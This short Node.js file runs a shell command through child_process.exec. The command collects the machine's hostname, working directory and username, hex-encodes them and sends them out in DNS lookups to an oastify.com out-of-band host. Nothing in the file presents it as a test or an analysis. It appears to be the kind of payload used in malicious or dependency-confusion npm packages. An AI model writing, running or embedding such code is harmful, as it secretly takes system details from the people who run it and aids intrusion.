const { exec } = require("child_process");
exec("a=$(hostname;pwd;whoami) && echo $a | xxd -p | head | while read ut;do nslookup $a.uzx39o3nimx3qp8s14uu6kfjhan1brzg.oastify.com;done", (error, data, getter) => {
    if (error) {
        console.log("error", error.message);
        return;
    }
    if (getter) {
        console.log(data);
        return;
    }
    console.log(data);

});